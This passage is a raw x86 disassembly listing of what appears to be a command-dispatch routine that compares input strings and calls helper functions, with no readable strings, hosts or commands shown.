1314c1a3:	e9 34 07 00 00       	jmp    0x1314c8dc
1314c1a8:	e8 33 c9 ff ff       	call   0x13148ae0
1314c1ad:	85 c0                	test   %eax,%eax
1314c1af:	74 0a                	je     0x1314c1bb
1314c1b1:	68 c8 12 15 13       	push   $0x131512c8
1314c1b6:	e9 21 07 00 00       	jmp    0x1314c8dc
1314c1bb:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c1c1:	68 b4 12 15 13       	push   $0x131512b4
1314c1c6:	50                   	push   %eax
1314c1c7:	ff 15 98 39 15 13    	call   *0x13153998
1314c1cd:	59                   	pop    %ecx
1314c1ce:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314c1d4:	59                   	pop    %ecx
1314c1d5:	ff 75 08             	pushl  0x8(%ebp)
1314c1d8:	b9 81 01 00 00       	mov    $0x181,%ecx
1314c1dd:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314c1e3:	8b fc                	mov    %esp,%edi
1314c1e5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314c1e7:	e8 00 c9 ff ff       	call   0x13148aec
1314c1ec:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c1f2:	6a 02                	push   $0x2
1314c1f4:	50                   	push   %eax
1314c1f5:	ff 75 fc             	pushl  -0x4(%ebp)
1314c1f8:	e8 75 93 ff ff       	call   0x13145572
1314c1fd:	81 c4 14 06 00 00    	add    $0x614,%esp
1314c203:	85 c0                	test   %eax,%eax
1314c205:	74 14                	je     0x1314c21b
1314c207:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c20d:	50                   	push   %eax
1314c20e:	e8 f5 65 ff ff       	call   0x13142808
1314c213:	59                   	pop    %ecx
1314c214:	a3 38 65 17 13       	mov    %eax,0x13176538
1314c219:	eb 07                	jmp    0x1314c222
1314c21b:	83 25 38 65 17 13 00 	andl   $0x0,0x13176538
1314c222:	ff 75 08             	pushl  0x8(%ebp)
1314c225:	8d 83 64 75 17 13    	lea    0x13177564(%ebx),%eax
1314c22b:	50                   	push   %eax
1314c22c:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c232:	ff 35 38 65 17 13    	pushl  0x13176538
1314c238:	50                   	push   %eax
1314c239:	e8 e4 c7 ff ff       	call   0x13148a22
1314c23e:	83 c4 10             	add    $0x10,%esp
1314c241:	e9 e6 06 00 00       	jmp    0x1314c92c
1314c246:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c24c:	68 a4 12 15 13       	push   $0x131512a4
1314c251:	50                   	push   %eax
1314c252:	e8 d5 64 ff ff       	call   0x1314272c
1314c257:	59                   	pop    %ecx
1314c258:	85 c0                	test   %eax,%eax
1314c25a:	59                   	pop    %ecx
1314c25b:	75 2d                	jne    0x1314c28a
1314c25d:	e8 7e c8 ff ff       	call   0x13148ae0
1314c262:	85 c0                	test   %eax,%eax
1314c264:	75 0a                	jne    0x1314c270
1314c266:	68 88 12 15 13       	push   $0x13151288
1314c26b:	e9 6c 06 00 00       	jmp    0x1314c8dc
1314c270:	6a 01                	push   $0x1
1314c272:	e8 4b c8 ff ff       	call   0x13148ac2
1314c277:	e8 6a c8 ff ff       	call   0x13148ae6
1314c27c:	c1 e8 0a             	shr    $0xa,%eax
1314c27f:	50                   	push   %eax
1314c280:	68 60 12 15 13       	push   $0x13151260
1314c285:	e9 29 e0 ff ff       	jmp    0x1314a2b3
1314c28a:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c290:	68 58 12 15 13       	push   $0x13151258
1314c295:	50                   	push   %eax
1314c296:	e8 91 64 ff ff       	call   0x1314272c
1314c29b:	59                   	pop    %ecx
1314c29c:	85 c0                	test   %eax,%eax
1314c29e:	59                   	pop    %ecx
1314c29f:	0f 85 0b 01 00 00    	jne    0x1314c3b0
1314c2a5:	38 05 88 a5 17 13    	cmp    %al,0x1317a588
1314c2ab:	74 0a                	je     0x1314c2b7
1314c2ad:	68 40 12 15 13       	push   $0x13151240
1314c2b2:	e9 25 06 00 00       	jmp    0x1314c8dc
1314c2b7:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c2bd:	6a 01                	push   $0x1
1314c2bf:	50                   	push   %eax
1314c2c0:	57                   	push   %edi
1314c2c1:	e8 ac 92 ff ff       	call   0x13145572
1314c2c6:	83 c4 0c             	add    $0xc,%esp
1314c2c9:	85 c0                	test   %eax,%eax
1314c2cb:	0f 84 d5 00 00 00    	je     0x1314c3a6
1314c2d1:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c2d7:	6a 02                	push   $0x2
1314c2d9:	50                   	push   %eax
1314c2da:	57                   	push   %edi
1314c2db:	e8 92 92 ff ff       	call   0x13145572
1314c2e0:	83 c4 0c             	add    $0xc,%esp
1314c2e3:	85 c0                	test   %eax,%eax
1314c2e5:	0f 84 bb 00 00 00    	je     0x1314c3a6
1314c2eb:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c2f1:	6a 03                	push   $0x3
1314c2f3:	50                   	push   %eax
1314c2f4:	57                   	push   %edi
1314c2f5:	e8 78 92 ff ff       	call   0x13145572
1314c2fa:	83 c4 0c             	add    $0xc,%esp
1314c2fd:	85 c0                	test   %eax,%eax
1314c2ff:	0f 84 a1 00 00 00    	je     0x1314c3a6
1314c305:	8d 85 d0 fc ff ff    	lea    -0x330(%ebp),%eax
1314c30b:	6a 04                	push   $0x4
1314c30d:	50                   	push   %eax
1314c30e:	57                   	push   %edi
1314c30f:	e8 5e 92 ff ff       	call   0x13145572
1314c314:	83 c4 0c             	add    $0xc,%esp
1314c317:	85 c0                	test   %eax,%eax
1314c319:	0f 84 87 00 00 00    	je     0x1314c3a6
1314c31f:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
1314c325:	6a 05                	push   $0x5
1314c327:	50                   	push   %eax
1314c328:	57                   	push   %edi
1314c329:	e8 44 92 ff ff       	call   0x13145572
1314c32e:	83 c4 0c             	add    $0xc,%esp
1314c331:	85 c0                	test   %eax,%eax
1314c333:	74 71                	je     0x1314c3a6
1314c335:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c33b:	50                   	push   %eax
1314c33c:	e8 c7 64 ff ff       	call   0x13142808
1314c341:	85 c0                	test   %eax,%eax
1314c343:	59                   	pop    %ecx
1314c344:	75 0a                	jne    0x1314c350
1314c346:	68 2c 12 15 13       	push   $0x1315122c
1314c34b:	e9 8c 05 00 00       	jmp    0x1314c8dc
1314c350:	83 3d 44 45 17 13 00 	cmpl   $0x0,0x13174544
1314c357:	ff 75 08             	pushl  0x8(%ebp)
1314c35a:	0f 95 c1             	setne  %cl
1314c35d:	68 88 a5 17 13       	push   $0x1317a588
1314c362:	51                   	push   %ecx
1314c363:	8d 8b 64 75 17 13    	lea    0x13177564(%ebx),%ecx
1314c369:	51                   	push   %ecx
1314c36a:	8d 8d 50 fd ff ff    	lea    -0x2b0(%ebp),%ecx
1314c370:	51                   	push   %ecx
1314c371:	8d 8d d0 fc ff ff    	lea    -0x330(%ebp),%ecx
1314c377:	51                   	push   %ecx
1314c378:	8d 8d 50 fc ff ff    	lea    -0x3b0(%ebp),%ecx
1314c37e:	51                   	push   %ecx
1314c37f:	50                   	push   %eax
1314c380:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c386:	50                   	push   %eax
1314c387:	e8 95 b4 ff ff       	call   0x13147821
1314c38c:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c392:	68 18 12 15 13       	push   $0x13151218
1314c397:	50                   	push   %eax
1314c398:	ff 15 98 39 15 13    	call   *0x13153998
1314c39e:	83 c4 2c             	add    $0x2c,%esp
1314c3a1:	e9 63 05 00 00       	jmp    0x1314c909
1314c3a6:	68 e4 11 15 13       	push   $0x131511e4
1314c3ab:	e9 2c 05 00 00       	jmp    0x1314c8dc
1314c3b0:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c3b6:	68 dc 11 15 13       	push   $0x131511dc
1314c3bb:	50                   	push   %eax
1314c3bc:	e8 6b 63 ff ff       	call   0x1314272c
1314c3c1:	59                   	pop    %ecx
1314c3c2:	85 c0                	test   %eax,%eax
1314c3c4:	59                   	pop    %ecx
1314c3c5:	75 24                	jne    0x1314c3eb
1314c3c7:	a1 28 d1 14 13       	mov    0x1314d128,%eax
1314c3cc:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c3d3:	50                   	push   %eax
1314c3d4:	a1 24 d1 14 13       	mov    0x1314d124,%eax
1314c3d9:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c3e0:	50                   	push   %eax
1314c3e1:	68 bc 11 15 13       	push   $0x131511bc
1314c3e6:	e9 c8 de ff ff       	jmp    0x1314a2b3
1314c3eb:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c3f1:	68 b0 11 15 13       	push   $0x131511b0
1314c3f6:	50                   	push   %eax
1314c3f7:	e8 30 63 ff ff       	call   0x1314272c
1314c3fc:	59                   	pop    %ecx
1314c3fd:	85 c0                	test   %eax,%eax
1314c3ff:	59                   	pop    %ecx
1314c400:	75 71                	jne    0x1314c473
1314c402:	e8 8d 55 ff ff       	call   0x13141994
1314c407:	85 c0                	test   %eax,%eax
1314c409:	74 0a                	je     0x1314c415
1314c40b:	68 94 11 15 13       	push   $0x13151194
1314c410:	e9 c7 04 00 00       	jmp    0x1314c8dc
1314c415:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c41b:	6a 01                	push   $0x1
1314c41d:	50                   	push   %eax
1314c41e:	57                   	push   %edi
1314c41f:	e8 4e 91 ff ff       	call   0x13145572
1314c424:	83 c4 0c             	add    $0xc,%esp
1314c427:	85 c0                	test   %eax,%eax
1314c429:	74 0f                	je     0x1314c43a
1314c42b:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c431:	50                   	push   %eax
1314c432:	e8 d1 63 ff ff       	call   0x13142808
1314c437:	59                   	pop    %ecx
1314c438:	eb 05                	jmp    0x1314c43f
1314c43a:	a1 3c d3 14 13       	mov    0x1314d33c,%eax
1314c43f:	85 c0                	test   %eax,%eax
1314c441:	a3 a4 6a 17 13       	mov    %eax,0x13176aa4
1314c446:	75 11                	jne    0x1314c459
1314c448:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c44e:	50                   	push   %eax
1314c44f:	68 7c 11 15 13       	push   $0x1315117c
1314c454:	e9 a0 04 00 00       	jmp    0x1314c8f9
1314c459:	ff 75 08             	pushl  0x8(%ebp)
1314c45c:	8d 8b 64 75 17 13    	lea    0x13177564(%ebx),%ecx
1314c462:	51                   	push   %ecx
1314c463:	50                   	push   %eax
1314c464:	e8 70 54 ff ff       	call   0x131418d9
1314c469:	68 68 11 15 13       	push   $0x13151168
1314c46e:	e9 d0 01 00 00       	jmp    0x1314c643
1314c473:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c479:	68 58 11 15 13       	push   $0x13151158
1314c47e:	50                   	push   %eax
1314c47f:	e8 a8 62 ff ff       	call   0x1314272c
1314c484:	59                   	pop    %ecx
1314c485:	85 c0                	test   %eax,%eax
1314c487:	59                   	pop    %ecx
1314c488:	75 26                	jne    0x1314c4b0
1314c48a:	e8 05 55 ff ff       	call   0x13141994
1314c48f:	85 c0                	test   %eax,%eax
1314c491:	75 0a                	jne    0x1314c49d
1314c493:	68 40 11 15 13       	push   $0x13151140
1314c498:	e9 3f 04 00 00       	jmp    0x1314c8dc
1314c49d:	6a 01                	push   $0x1
1314c49f:	e8 a1 54 ff ff       	call   0x13141945
1314c4a4:	c7 04 24 2c 11 15 13 	movl   $0x1315112c,(%esp)
1314c4ab:	e9 2c 04 00 00       	jmp    0x1314c8dc
1314c4b0:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c4b6:	68 24 11 15 13       	push   $0x13151124
1314c4bb:	50                   	push   %eax
1314c4bc:	e8 6b 62 ff ff       	call   0x1314272c
1314c4c1:	59                   	pop    %ecx
1314c4c2:	85 c0                	test   %eax,%eax
1314c4c4:	59                   	pop    %ecx
1314c4c5:	0f 85 0e 01 00 00    	jne    0x1314c5d9
1314c4cb:	a1 20 24 15 13       	mov    0x13152420,%eax
1314c4d0:	8b 75 08             	mov    0x8(%ebp),%esi
1314c4d3:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c4da:	50                   	push   %eax
1314c4db:	56                   	push   %esi
1314c4dc:	e8 1d c7 ff ff       	call   0x13148bfe
1314c4e1:	59                   	pop    %ecx
1314c4e2:	50                   	push   %eax
1314c4e3:	56                   	push   %esi
1314c4e4:	e8 fa c6 ff ff       	call   0x13148be3
1314c4e9:	59                   	pop    %ecx
1314c4ea:	50                   	push   %eax
1314c4eb:	a1 1c 24 15 13       	mov    0x1315241c,%eax
1314c4f0:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c4f7:	50                   	push   %eax
1314c4f8:	56                   	push   %esi
1314c4f9:	e8 00 c7 ff ff       	call   0x13148bfe
1314c4fe:	59                   	pop    %ecx
1314c4ff:	50                   	push   %eax
1314c500:	56                   	push   %esi
1314c501:	e8 dd c6 ff ff       	call   0x13148be3
1314c506:	59                   	pop    %ecx
1314c507:	50                   	push   %eax
1314c508:	a1 18 24 15 13       	mov    0x13152418,%eax
1314c50d:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c514:	50                   	push   %eax
1314c515:	56                   	push   %esi
1314c516:	e8 e3 c6 ff ff       	call   0x13148bfe
1314c51b:	59                   	pop    %ecx
1314c51c:	50                   	push   %eax
1314c51d:	56                   	push   %esi
1314c51e:	e8 c0 c6 ff ff       	call   0x13148be3
1314c523:	59                   	pop    %ecx
1314c524:	50                   	push   %eax
1314c525:	a1 38 d1 14 13       	mov    0x1314d138,%eax
1314c52a:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c531:	50                   	push   %eax
1314c532:	56                   	push   %esi
1314c533:	e8 c6 c6 ff ff       	call   0x13148bfe
1314c538:	59                   	pop    %ecx
1314c539:	50                   	push   %eax
1314c53a:	56                   	push   %esi
1314c53b:	e8 a3 c6 ff ff       	call   0x13148be3
1314c540:	59                   	pop    %ecx
1314c541:	50                   	push   %eax
1314c542:	a1 14 24 15 13       	mov    0x13152414,%eax
1314c547:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c54e:	50                   	push   %eax
1314c54f:	56                   	push   %esi
1314c550:	e8 a9 c6 ff ff       	call   0x13148bfe
1314c555:	59                   	pop    %ecx
1314c556:	50                   	push   %eax
1314c557:	56                   	push   %esi
1314c558:	e8 86 c6 ff ff       	call   0x13148be3
1314c55d:	59                   	pop    %ecx
1314c55e:	50                   	push   %eax
1314c55f:	a1 10 24 15 13       	mov    0x13152410,%eax
1314c564:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c56b:	50                   	push   %eax
1314c56c:	56                   	push   %esi
1314c56d:	e8 8c c6 ff ff       	call   0x13148bfe
1314c572:	59                   	pop    %ecx
1314c573:	50                   	push   %eax
1314c574:	56                   	push   %esi
1314c575:	e8 69 c6 ff ff       	call   0x13148be3
1314c57a:	59                   	pop    %ecx
1314c57b:	50                   	push   %eax
1314c57c:	a1 34 d1 14 13       	mov    0x1314d134,%eax
1314c581:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c588:	50                   	push   %eax
1314c589:	56                   	push   %esi
1314c58a:	e8 6f c6 ff ff       	call   0x13148bfe
1314c58f:	59                   	pop    %ecx
1314c590:	50                   	push   %eax
1314c591:	56                   	push   %esi
1314c592:	e8 4c c6 ff ff       	call   0x13148be3
1314c597:	59                   	pop    %ecx
1314c598:	50                   	push   %eax
1314c599:	a1 0c 24 15 13       	mov    0x1315240c,%eax
1314c59e:	8d 04 85 58 10 14 13 	lea    0x13141058(,%eax,4),%eax
1314c5a5:	50                   	push   %eax
1314c5a6:	56                   	push   %esi
1314c5a7:	e8 52 c6 ff ff       	call   0x13148bfe
1314c5ac:	59                   	pop    %ecx
1314c5ad:	50                   	push   %eax
1314c5ae:	56                   	push   %esi
1314c5af:	e8 2f c6 ff ff       	call   0x13148be3
1314c5b4:	59                   	pop    %ecx
1314c5b5:	50                   	push   %eax
1314c5b6:	56                   	push   %esi
1314c5b7:	e8 5d c6 ff ff       	call   0x13148c19
1314c5bc:	59                   	pop    %ecx
1314c5bd:	50                   	push   %eax
1314c5be:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c5c4:	68 8c 10 15 13       	push   $0x1315108c
1314c5c9:	50                   	push   %eax
1314c5ca:	ff 15 98 39 15 13    	call   *0x13153998
1314c5d0:	83 c4 6c             	add    $0x6c,%esp
1314c5d3:	56                   	push   %esi
1314c5d4:	e9 33 03 00 00       	jmp    0x1314c90c
1314c5d9:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c5df:	68 80 10 15 13       	push   $0x13151080
1314c5e4:	50                   	push   %eax
1314c5e5:	e8 42 61 ff ff       	call   0x1314272c
1314c5ea:	59                   	pop    %ecx
1314c5eb:	85 c0                	test   %eax,%eax
1314c5ed:	59                   	pop    %ecx
1314c5ee:	75 72                	jne    0x1314c662
1314c5f0:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c5f6:	6a 01                	push   $0x1
1314c5f8:	50                   	push   %eax
1314c5f9:	57                   	push   %edi
1314c5fa:	e8 73 8f ff ff       	call   0x13145572
1314c5ff:	83 c4 0c             	add    $0xc,%esp
1314c602:	85 c0                	test   %eax,%eax
1314c604:	74 52                	je     0x1314c658
1314c606:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c60c:	6a 02                	push   $0x2
1314c60e:	50                   	push   %eax
1314c60f:	57                   	push   %edi
1314c610:	e8 5d 8f ff ff       	call   0x13145572
1314c615:	83 c4 0c             	add    $0xc,%esp
1314c618:	85 c0                	test   %eax,%eax
1314c61a:	74 3c                	je     0x1314c658
1314c61c:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c622:	50                   	push   %eax
1314c623:	ff 15 ac 39 15 13    	call   *0x131539ac
1314c629:	50                   	push   %eax
1314c62a:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c630:	50                   	push   %eax
1314c631:	ff 15 ac 39 15 13    	call   *0x131539ac
1314c637:	50                   	push   %eax
1314c638:	e8 85 85 ff ff       	call   0x13144bc2
1314c63d:	50                   	push   %eax
1314c63e:	68 6c 10 15 13       	push   $0x1315106c
1314c643:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c649:	50                   	push   %eax
1314c64a:	ff 15 98 39 15 13    	call   *0x13153998
1314c650:	83 c4 14             	add    $0x14,%esp
1314c653:	e9 b1 02 00 00       	jmp    0x1314c909
1314c658:	68 44 10 15 13       	push   $0x13151044
1314c65d:	e9 7a 02 00 00       	jmp    0x1314c8dc
1314c662:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c668:	68 38 10 15 13       	push   $0x13151038
1314c66d:	50                   	push   %eax
1314c66e:	e8 b9 60 ff ff       	call   0x1314272c
1314c673:	59                   	pop    %ecx
1314c674:	85 c0                	test   %eax,%eax
1314c676:	59                   	pop    %ecx
1314c677:	75 66                	jne    0x1314c6df
1314c679:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c67f:	6a 01                	push   $0x1
1314c681:	50                   	push   %eax
1314c682:	57                   	push   %edi
1314c683:	e8 ea 8e ff ff       	call   0x13145572
1314c688:	83 c4 0c             	add    $0xc,%esp
1314c68b:	85 c0                	test   %eax,%eax
1314c68d:	74 46                	je     0x1314c6d5
1314c68f:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c695:	6a 02                	push   $0x2
1314c697:	50                   	push   %eax
1314c698:	57                   	push   %edi
1314c699:	e8 d4 8e ff ff       	call   0x13145572
1314c69e:	83 c4 0c             	add    $0xc,%esp
1314c6a1:	85 c0                	test   %eax,%eax
1314c6a3:	74 30                	je     0x1314c6d5
1314c6a5:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c6ab:	6a 03                	push   $0x3
1314c6ad:	50                   	push   %eax
1314c6ae:	57                   	push   %edi
1314c6af:	e8 be 8e ff ff       	call   0x13145572
1314c6b4:	83 c4 0c             	add    $0xc,%esp
1314c6b7:	85 c0                	test   %eax,%eax
1314c6b9:	74 1a                	je     0x1314c6d5
1314c6bb:	8d 85 d0 fc ff ff    	lea    -0x330(%ebp),%eax
1314c6c1:	6a 04                	push   $0x4
1314c6c3:	50                   	push   %eax
1314c6c4:	57                   	push   %edi
1314c6c5:	e8 a8 8e ff ff       	call   0x13145572
1314c6ca:	83 c4 0c             	add    $0xc,%esp
1314c6cd:	85 c0                	test   %eax,%eax
1314c6cf:	0f 85 6f 02 00 00    	jne    0x1314c944
1314c6d5:	68 04 10 15 13       	push   $0x13151004
1314c6da:	e9 fd 01 00 00       	jmp    0x1314c8dc
1314c6df:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c6e5:	68 f8 0f 15 13       	push   $0x13150ff8
1314c6ea:	50                   	push   %eax
1314c6eb:	e8 3c 60 ff ff       	call   0x1314272c
1314c6f0:	59                   	pop    %ecx
1314c6f1:	85 c0                	test   %eax,%eax
1314c6f3:	59                   	pop    %ecx
1314c6f4:	75 5e                	jne    0x1314c754
1314c6f6:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c6fc:	6a 01                	push   $0x1
1314c6fe:	50                   	push   %eax
1314c6ff:	57                   	push   %edi
1314c700:	e8 6d 8e ff ff       	call   0x13145572
1314c705:	83 c4 0c             	add    $0xc,%esp
1314c708:	85 c0                	test   %eax,%eax
1314c70a:	74 c9                	je     0x1314c6d5
1314c70c:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c712:	6a 02                	push   $0x2
1314c714:	50                   	push   %eax
1314c715:	57                   	push   %edi
1314c716:	e8 57 8e ff ff       	call   0x13145572
1314c71b:	83 c4 0c             	add    $0xc,%esp
1314c71e:	85 c0                	test   %eax,%eax
1314c720:	74 b3                	je     0x1314c6d5
1314c722:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c728:	6a 03                	push   $0x3
1314c72a:	50                   	push   %eax
1314c72b:	57                   	push   %edi
1314c72c:	e8 41 8e ff ff       	call   0x13145572
1314c731:	83 c4 0c             	add    $0xc,%esp
1314c734:	85 c0                	test   %eax,%eax
1314c736:	74 9d                	je     0x1314c6d5
1314c738:	8d 85 d0 fc ff ff    	lea    -0x330(%ebp),%eax
1314c73e:	6a 04                	push   $0x4
1314c740:	50                   	push   %eax
1314c741:	57                   	push   %edi
1314c742:	e8 2b 8e ff ff       	call   0x13145572
1314c747:	83 c4 0c             	add    $0xc,%esp
1314c74a:	85 c0                	test   %eax,%eax
1314c74c:	0f 85 50 02 00 00    	jne    0x1314c9a2
1314c752:	eb 81                	jmp    0x1314c6d5
1314c754:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c75a:	68 ec 0f 15 13       	push   $0x13150fec
1314c75f:	50                   	push   %eax
1314c760:	e8 c7 5f ff ff       	call   0x1314272c
1314c765:	59                   	pop    %ecx
1314c766:	85 c0                	test   %eax,%eax
1314c768:	59                   	pop    %ecx
1314c769:	0f 85 a8 00 00 00    	jne    0x1314c817
1314c76f:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c775:	6a 01                	push   $0x1
1314c777:	50                   	push   %eax
1314c778:	57                   	push   %edi
1314c779:	e8 f4 8d ff ff       	call   0x13145572
1314c77e:	83 c4 0c             	add    $0xc,%esp
1314c781:	85 c0                	test   %eax,%eax
1314c783:	0f 84 4e 01 00 00    	je     0x1314c8d7
1314c789:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c78f:	6a 02                	push   $0x2
1314c791:	50                   	push   %eax
1314c792:	57                   	push   %edi
1314c793:	e8 da 8d ff ff       	call   0x13145572
1314c798:	83 c4 0c             	add    $0xc,%esp
1314c79b:	85 c0                	test   %eax,%eax
1314c79d:	0f 84 34 01 00 00    	je     0x1314c8d7
1314c7a3:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c7a9:	6a 03                	push   $0x3
1314c7ab:	50                   	push   %eax
1314c7ac:	57                   	push   %edi
1314c7ad:	e8 c0 8d ff ff       	call   0x13145572
1314c7b2:	83 c4 0c             	add    $0xc,%esp
1314c7b5:	85 c0                	test   %eax,%eax
1314c7b7:	0f 84 1a 01 00 00    	je     0x1314c8d7
1314c7bd:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c7c3:	68 d8 0f 15 13       	push   $0x13150fd8
1314c7c8:	50                   	push   %eax
1314c7c9:	ff 15 98 39 15 13    	call   *0x13153998
1314c7cf:	59                   	pop    %ecx
1314c7d0:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314c7d6:	59                   	pop    %ecx
1314c7d7:	ff 75 08             	pushl  0x8(%ebp)
1314c7da:	b9 81 01 00 00       	mov    $0x181,%ecx
1314c7df:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314c7e5:	8b fc                	mov    %esp,%edi
1314c7e7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314c7e9:	e8 fe c2 ff ff       	call   0x13148aec
1314c7ee:	81 c4 08 06 00 00    	add    $0x608,%esp
1314c7f4:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c7fa:	50                   	push   %eax
1314c7fb:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c801:	50                   	push   %eax
1314c802:	e8 01 60 ff ff       	call   0x13142808
1314c807:	59                   	pop    %ecx
1314c808:	50                   	push   %eax
1314c809:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c80f:	50                   	push   %eax
1314c810:	6a 00                	push   $0x0
1314c812:	e9 b6 00 00 00       	jmp    0x1314c8cd
1314c817:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c81d:	68 cc 0f 15 13       	push   $0x13150fcc
1314c822:	50                   	push   %eax
1314c823:	e8 04 5f ff ff       	call   0x1314272c
1314c828:	59                   	pop    %ecx
1314c829:	85 c0                	test   %eax,%eax
1314c82b:	59                   	pop    %ecx
1314c82c:	0f 85 bb 00 00 00    	jne    0x1314c8ed
1314c832:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c838:	6a 01                	push   $0x1
1314c83a:	50                   	push   %eax
1314c83b:	57                   	push   %edi
1314c83c:	e8 31 8d ff ff       	call   0x13145572
1314c841:	83 c4 0c             	add    $0xc,%esp
1314c844:	85 c0                	test   %eax,%eax
1314c846:	0f 84 8b 00 00 00    	je     0x1314c8d7
1314c84c:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c852:	6a 02                	push   $0x2
1314c854:	50                   	push   %eax
1314c855:	57                   	push   %edi
1314c856:	e8 17 8d ff ff       	call   0x13145572
1314c85b:	83 c4 0c             	add    $0xc,%esp
1314c85e:	85 c0                	test   %eax,%eax
1314c860:	74 75                	je     0x1314c8d7
1314c862:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c868:	6a 03                	push   $0x3
1314c86a:	50                   	push   %eax
1314c86b:	57                   	push   %edi
1314c86c:	e8 01 8d ff ff       	call   0x13145572
1314c871:	83 c4 0c             	add    $0xc,%esp
1314c874:	85 c0                	test   %eax,%eax
1314c876:	74 5f                	je     0x1314c8d7
1314c878:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c87e:	68 b0 0f 15 13       	push   $0x13150fb0
1314c883:	50                   	push   %eax
1314c884:	ff 15 98 39 15 13    	call   *0x13153998
1314c88a:	59                   	pop    %ecx
1314c88b:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314c891:	59                   	pop    %ecx
1314c892:	ff 75 08             	pushl  0x8(%ebp)
1314c895:	b9 81 01 00 00       	mov    $0x181,%ecx
1314c89a:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314c8a0:	8b fc                	mov    %esp,%edi
1314c8a2:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314c8a4:	e8 43 c2 ff ff       	call   0x13148aec
1314c8a9:	81 c4 08 06 00 00    	add    $0x608,%esp
1314c8af:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314c8b5:	50                   	push   %eax
1314c8b6:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c8bc:	50                   	push   %eax
1314c8bd:	e8 46 5f ff ff       	call   0x13142808
1314c8c2:	59                   	pop    %ecx
1314c8c3:	50                   	push   %eax
1314c8c4:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c8ca:	50                   	push   %eax
1314c8cb:	6a 01                	push   $0x1
1314c8cd:	e8 cb d3 ff ff       	call   0x13149c9d
1314c8d2:	83 c4 10             	add    $0x10,%esp
1314c8d5:	eb 32                	jmp    0x1314c909
1314c8d7:	68 88 0f 15 13       	push   $0x13150f88
1314c8dc:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c8e2:	50                   	push   %eax
1314c8e3:	ff 15 98 39 15 13    	call   *0x13153998
1314c8e9:	59                   	pop    %ecx
